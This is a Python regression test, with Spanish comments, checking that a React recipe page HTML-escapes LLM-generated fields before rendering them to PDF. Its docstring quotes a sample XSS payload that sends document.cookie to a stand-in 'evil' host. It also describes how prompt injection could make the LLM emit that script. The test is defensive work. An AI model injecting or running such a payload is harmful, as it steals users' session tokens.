"""[P2-AUDIT-2 · 2026-05-15] Test parser-based: `Recipes.jsx::generateRecipeHTML`
escapa el contenido del LLM (meal.name, desc, meal, cals, recipe steps,
ingredients) antes de interpolarlo al `htmlString` que se pasa a
`html2pdf().from(htmlString, 'string').save()`.

Por qué este test:
    html2pdf usa html2canvas internamente, que renderiza el `htmlString` en
    un iframe detached para capturar como PDF. Si la LLM emite
    `</style><script>fetch('//evil/?'+document.cookie)</script>` (caso
    prompt-injection adversarial via user input), ese script ejecutaría en
    el contexto del iframe — un atacante podría exfiltrar tokens del
    localStorage del usuario.

    El test blanket `test_p1_pdf_innerhtml_xss_blanket.py` cubría solo
    `Dashboard.jsx`; el audit 2026-05-15 detectó que `Recipes.jsx` quedó
    fuera del scope. Este test cierra el gap.

Fix esperado:
    - Helper `escapeHtml(input)` en `frontend/src/utils/escapeHtml.js`
      (exportado, escapa `<>&"'` a entities).
    - `Recipes.jsx` importa `escapeHtml` y lo aplica a TODAS las
      interpolaciones de variables provenientes del LLM dentro de
      `generateRecipeHTML`. Variables determinísticas (e.g., `color`
      del mapping local) NO necesitan escape.

Drift detection:
    - `frontend/src/utils/escapeHtml.js` existe y exporta `escapeHtml`.
    - `Recipes.jsx` importa el helper.
    - `generateRecipeHTML` aplica `escapeHtml(...)` a las interpolaciones
      sospechosas: `meal.name`, `meal.desc`, `meal.meal`, `meal.cals`,
      `ing`, `sectionTitle`, y bold parser opera sobre texto YA escapado.

Cross-link convention (P2-HIST-AUDIT-14): slug `p2_audit_2`.

Tooltip-anchor: P2-AUDIT-2-START | gap audit 2026-05-15
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest


_REPO_ROOT = Path(__file__).resolve().parent.parent.parent
_RECIPES_JSX = _REPO_ROOT / "frontend" / "src" / "pages" / "Recipes.jsx"
_ESCAPE_HTML_JS = _REPO_ROOT / "frontend" / "src" / "utils" / "escapeHtml.js"


@pytest.fixture(scope="module")
def recipes_src() -> str:
    return _RECIPES_JSX.read_text(encoding="utf-8")


@pytest.fixture(scope="module")
def escape_html_src() -> str:
    return _ESCAPE_HTML_JS.read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# 1. utils/escapeHtml.js existe y exporta escapeHtml
# ---------------------------------------------------------------------------
def test_escape_html_module_exists():
    assert _ESCAPE_HTML_JS.exists(), (
        "P2-AUDIT-2 regresión: `frontend/src/utils/escapeHtml.js` no existe. "
        "Crear el helper SSOT con `export function escapeHtml(input)` que "
        "escape `<>&\"'` a entities."
    )


def test_escape_html_exports_function(escape_html_src: str):
    assert re.search(
        r"export\s+function\s+escapeHtml\s*\(",
        escape_html_src,
    ), (
        "P2-AUDIT-2 regresión: `export function escapeHtml(...)` no "
        "encontrado en escapeHtml.js. Si renombró, actualizar callsites."
    )


def test_escape_html_handles_all_5_entities(escape_html_src: str):
    """El helper debe escapar `<`, `>`, `&`, `"`, `'`. Sin los 5, casos
    edge como `onclick='alert()'` pueden escapar el atributo."""
    for entity in ("&amp;", "&lt;", "&gt;", "&quot;", "&#39;"):
        assert entity in escape_html_src, (
            f"P2-AUDIT-2 regresión: entidad `{entity}` no aparece en el "
            f"helper escapeHtml. Sin las 5 entities (&, <, >, \", '), casos "
            f"edge pueden escapar el atributo HTML."
        )


# ---------------------------------------------------------------------------
# 2. Recipes.jsx importa escapeHtml
# ---------------------------------------------------------------------------
def test_recipes_imports_escape_html(recipes_src: str):
    assert re.search(
        r"import\s*\{[^}]*\bescapeHtml\b[^}]*\}\s*from\s*['\"][^'\"]*escapeHtml['\"]",
        recipes_src,
    ), (
        "P2-AUDIT-2 regresión: `import { escapeHtml } from '.../escapeHtml'` "
        "no encontrado en Recipes.jsx. Añadir el import para usar el helper."
    )


# ---------------------------------------------------------------------------
# 3. generateRecipeHTML aplica escapeHtml a las interpolaciones sospechosas
# ---------------------------------------------------------------------------
def _extract_function_body(src: str) -> str:
    """Aísla `const generateRecipeHTML = (meal) => { ... }` hasta el
    siguiente `const handleDownloadPDF` o `return (` del componente."""
    anchor = re.search(
        r"const\s+generateRecipeHTML\s*=\s*\(\s*meal\s*\)\s*=>\s*\{",
        src,
    )
    assert anchor is not None, (
        "P2-AUDIT-2 regresión: `const generateRecipeHTML = (meal) => {` no "
        "encontrado en Recipes.jsx. ¿Renombrado? Actualizar test."
    )
    start = anchor.end()
    rest = src[start:]
    next_block = re.search(
        r"\n    (?:const\s+handleDownloadPDF|return\s*\()",
        rest,
    )
    end = start + (next_block.start() if next_block else len(rest))
    return src[start:end]


@pytest.fixture(scope="module")
def fn_body(recipes_src: str) -> str:
    return _extract_function_body(recipes_src)


_INTERPOLATIONS_REQUIRING_ESCAPE = [
    "meal.name",
    "meal.desc",
    "meal.meal",
    "meal.cals",
]


@pytest.mark.parametrize("var_name", _INTERPOLATIONS_REQUIRING_ESCAPE)
def test_interpolation_uses_escape_html(fn_body: str, var_name: str):
    """Cada `${meal.xxx}` interpolación de variable proveniente del LLM debe
    estar envuelta en `escapeHtml(...)`."""
    # Patrón canónico: `${escapeHtml(meal.xxx)}` o variaciones (e.g.
    # `${escapeHtml(meal.xxx || '')}`).
    escaped_re = re.compile(
        rf"\$\{{\s*escapeHtml\s*\(\s*{re.escape(var_name)}",
    )
    # Patrón de regresión: `${meal.xxx}` o `${meal.xxx || ''}` SIN envolver
    # en escapeHtml.
    raw_re = re.compile(
        rf"\$\{{\s*{re.escape(var_name)}(?:\s*\|\|\s*['\"]?[\w]*['\"]?)?\s*\}}",
    )
    raw_matches = raw_re.findall(fn_body)
    assert not raw_matches, (
        f"P2-AUDIT-2 regresión: encontrada interpolación raw `${{{var_name}}}` "
        f"en `generateRecipeHTML` sin envoltura `escapeHtml(...)`. La LLM "
        f"controla esta variable; un prompt adversarial puede inyectar "
        f"`<script>` que ejecute en el iframe de html2canvas. Envolver: "
        f"`${{escapeHtml({var_name})}}`. Matches: {raw_matches}"
    )
    assert escaped_re.search(fn_body), (
        f"P2-AUDIT-2 regresión: `${{escapeHtml({var_name})}}` no encontrado "
        f"en `generateRecipeHTML`. Aplicar escapeHtml a la interpolación."
    )


def test_ingredients_uses_escape_html(fn_body: str):
    """La iteración sobre `meal.ingredients` debe escapar cada `ing`."""
    # Aceptar `${escapeHtml(ing)}` en cualquier forma.
    assert re.search(
        r"\$\{\s*escapeHtml\s*\(\s*ing\b",
        fn_body,
    ), (
        "P2-AUDIT-2 regresión: la iteración `meal.ingredients.map(ing => ...)` "
        "no escapa `${ing}` con `escapeHtml(...)`. Aplicar."
    )


def test_recipe_steps_use_escape_html(fn_body: str):
    """Los recipe steps deben pasar por un parser que escape primero y bold
    después (`parseBoldEscaped` o equivalente). El test acepta cualquier
    forma siempre que el resultado del parser invoque escapeHtml."""
    # Buscar una invocación de escapeHtml dentro del scope del parser de
    # steps. El bold parser debe operar sobre texto ya escapado.
    assert re.search(
        r"escapeHtml\s*\(\s*\w+\s*\)\.replace\s*\(\s*/\\\*\\\*",
        fn_body,
    ), (
        "P2-AUDIT-2 regresión: el bold parser sobre recipe steps debe "
        "operar sobre `escapeHtml(raw).replace(/\\*\\*.../)` para que el "
        "escape preceda al bold. Sin esto, `**<script>**` queda como "
        "`<strong><script></strong>` ejecutable."
    )


# ---------------------------------------------------------------------------
# 4. Anchor textual P2-AUDIT-2 presente
# ---------------------------------------------------------------------------
def test_anchor_present(recipes_src: str):
    assert "P2-AUDIT-2" in recipes_src, (
        "P2-AUDIT-2 regresión: anchor textual `P2-AUDIT-2` perdido en "
        "Recipes.jsx. Restaurar para grep cross-incidente."
    )
